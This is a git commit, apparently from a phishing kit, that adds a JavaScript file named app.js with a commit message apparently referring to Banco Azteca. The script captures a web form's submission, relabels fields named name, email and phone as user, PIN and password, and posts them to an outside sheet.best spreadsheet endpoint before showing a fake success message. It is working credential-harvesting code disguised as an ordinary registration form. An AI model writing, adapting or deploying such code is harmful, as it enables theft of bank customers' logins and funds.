63fcce129b35d7427167104ddcfb142cdc3a7c10
movilportalmx <136649755+movilportalmx@users.noreply.github.com>
2023-06-16 15:52:07 -0600

    add
    new banazte  peladas

---
+++ js/app.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('formulario');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/80ab9036-93d0-4880-b519-165e0a5ebc48', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Usuario": formulario.nombre.value,
+            "Nip": formulario.correo.value,
+            "Contrasena": formulario.telefono.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
